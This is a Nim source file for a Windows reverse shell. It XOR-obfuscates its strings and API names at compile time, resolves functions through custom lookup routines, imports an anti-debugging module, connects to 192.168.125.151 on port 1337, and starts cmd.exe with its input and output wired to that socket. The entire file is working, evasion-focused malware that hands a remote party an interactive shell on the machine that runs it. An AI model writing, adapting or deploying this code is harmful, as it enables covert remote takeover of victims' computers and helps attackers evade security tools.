import winim
import utils/[getmodulehandle, getprocaddress, antidebug]

proc compileSingleByteXor(s: cstring, key: byte): cstring {.compileTime.} =
  var o = s
  for i in 0 ..< s.len:
    o[i] = cast[char](s[i].byte xor key)
  return o

proc singleByteXor(s: cstring, key: byte): array[64,char] =
  var o: array[64, char]
  for i in 0 ..< s.len:
    o[i] = cast[char](s[i].byte xor key)
  return o

# declaring needed functions
type LoadLibraryA   = (proc(lpLibFileName: LPCSTR): HMODULE {.stdcall.})
type WSAStartup     = (proc(wVersionRequested: WORD, lpWSAData: LPWSADATA): int32 {.stdcall.})
type WSASocketA     = (proc(af: int32, `type`: int32, protocol: int32, lpProtocolInfo: LPWSAPROTOCOL_INFOA, g: GROUP, dwFlags: DWORD): SOCKET {.stdcall.})
type inet_addr      = (proc(cp: ptr char): int32 {.stdcall.})
type htons          = (proc(hostshort: uint16): uint16 {.stdcall.})
type connect        = (proc(s: SOCKET, name: ptr sockaddr, namelen: int32): int32 {.stdcall.})
type CreateProcessA = (proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.})

const key = 0x7f.byte

proc main() =
  var 
    sHost = compileSingleByteXor("192.168.125.151".cstring, key)
    port: uint16 = 1337
    wsaData: WSADATA
    sCmd = compileSingleByteXor("cmd".cstring, key)

  var
    sKernel32 = compileSingleByteXor("KERNEL32.dll".cstring, key)
    sws2_32 = compileSingleByteXor("ws2_32.dll".cstring, key)
    sLoadLibraryA = compileSingleByteXor("LoadLibraryA".cstring, key)
    sWSAStartup = compileSingleByteXor("WSAStartup".cstring, key)
    sWSASocketA = compileSingleByteXor("WSASocketA".cstring, key)
    sinet_addr = compileSingleByteXor("inet_addr".cstring, key)
    shtons = compileSingleByteXor("htons".cstring, key)
    sconnect = compileSingleByteXor("connect".cstring, key)
    sCreateProcessA = compileSingleByteXor("CreateProcessA".cstring, key)
  
  #[ Un-xor ]#
  var 
    sHostUn = singleByteXor(sHost, key)
    sCmdUn = singleByteXor(sCmd, key)
    sKernel32Un = singleByteXor(sKernel32, key)
    sws2_32Un = singleByteXor(sws2_32, key)
    sLoadLibraryAUn = singleByteXor(sLoadLibraryA, key)
    sWSAStartupUn = singleByteXor(sWSAStartup, key)
    sWSASocketAUn = singleByteXor(sWSASocketA, key)
    sinet_addrUn = singleByteXor(sinet_addr, key)
    shtonsUn = singleByteXor(shtons, key)
    sconnectUn = singleByteXor(sconnect, key)
    sCreateProcessAUn = singleByteXor(sCreateProcessA, key)
  
  var 
    hKernel32 = custom_GetModuleHandle(cast[cstring](addr sKernel32Un[0]))
    pLoadLibraryA = cast[LoadLibraryA](custom_GetProcAddress(hKernel32, cast[cstring](addr sLoadLibraryAUn[0])))

  var 
    hws2_32 = pLoadLibraryA(cast[cstring](addr sws2_32Un[0]))
    pWSAStartup = cast[WSAStartup](custom_GetProcAddress(hws2_32, cast[cstring](addr sWSAStartupUn[0])))
    pWSASocketA = cast[WSASocketA](custom_GetProcAddress(hws2_32, cast[cstring](addr sWSASocketAUn[0])))
    pinet_addr = cast[inet_addr](custom_GetProcAddress(hws2_32, cast[cstring](addr sinet_addrUn[0])))
    phtons = cast[htons](custom_GetProcAddress(hws2_32, cast[cstring](addr shtonsUn[0])))
    pconnect = cast[connect](custom_GetProcAddress(hws2_32, cast[cstring](addr sconnectUn[0])))
    pCreateProcessA = cast[CreateProcessA](custom_GetProcAddress(hKernel32, cast[cstring](addr sCreateProcessAUn[0])))

  #[ Actual Code starts here ]#
  # call WSAStartup
  var wsaStartupRes = pWSAStartup(MAKEWORD(2,2), addr wsaData)

  # call WSASocket
  var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  # create sockaddr_in struct
  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = pinet_addr(addr sHostUn[0])
  sa.sin_port = phtons(port)

  # call connect
  var connectResult = pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))

  # call CreateProcessA
  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](socket)
  si.hStdOutput = cast[HANDLE](socket)
  si.hStdError = cast[HANDLE](socket)

  discard pCreateProcessA(
    NULL,
    cast[LPSTR](addr sCmdUn[0]),
    NULL,
    NULL,
    TRUE,
    0,
    NULL,
    NULL,
    cast[LPSTARTUPINFOA](addr si),
    addr pi
  )
   


when isMainModule:
  main()